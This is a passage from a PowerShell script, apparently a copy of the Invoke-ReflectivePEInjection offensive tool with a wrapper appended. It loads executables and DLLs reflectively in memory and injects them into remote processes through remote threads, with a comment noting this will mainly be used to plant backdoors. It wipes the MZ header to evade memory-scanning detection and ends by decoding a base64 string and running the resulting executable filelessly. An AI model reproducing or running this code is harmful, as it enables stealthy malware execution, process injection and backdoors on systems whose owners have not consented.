            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    
    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }
    
    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}

 
# Convert base64 string to byte array
 
$PEBytes = [System.Convert]::FromBase64String($InputString)
 
# Run EXE in memory
 
Invoke-ReflectivePEInjection -PEBytes $PEBytes #-ExeArgs "Arg1 Arg2 Arg3 Arg4"
}

